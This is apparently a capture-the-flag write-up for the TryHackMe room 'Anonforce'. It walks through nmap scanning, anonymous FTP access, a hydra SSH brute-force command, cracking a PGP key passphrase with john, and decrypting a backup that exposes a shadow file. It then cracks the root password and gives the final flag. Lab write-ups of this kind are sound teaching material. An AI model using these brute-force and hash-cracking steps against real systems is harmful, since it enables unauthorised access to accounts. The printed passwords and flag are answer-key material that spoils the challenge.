# [Challenge](https://tryhackme.com/room/bsidesgtanonforce)

- # ENUM
	- ### nmap (`nmap -A -p- -T4 --min-rate 5000 anonforce`)
		- 21 -> ftp (anonymous allowed) (vsftpd 3.0.3)
		- 22 -> ssh

- # EXPLOITATION & PRIV. ESC.
Let's get into anonymous FTP: we can see that there's the entire file system on it. Let's grab the user flag (`melodias`).
Let's also bruteforce with `hydra` for melodias' password: `hydra -l melodias -P /usr/share/wordlists/rockyou.txt ssh://anonforce -t 64 -I -V`: it didn't work :\ 
I also searched for a `vsftpd 3.0.3` exploit, but nothing... Let's analyze better our ftp server: there's a strange directory: `notread` , containing a PGP (Pretty Good Privacy) key and a key (`private.asc`). Let's use `john`:  `gpg2john private.asc > hash` -> `john hash`
Password: `xbox360`
Let's import the key: `gpg --import private.asc` -> `gpg --decrypt backup.pgp`:
```
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::% 
```
Very good! Let's use `john` again (SHA256): `john hash`
Password (root): `hikari`
Perfect! Let's log into ssh as root and let's grab the flag!
`f706456440c7af4187810c31c6cebdce`
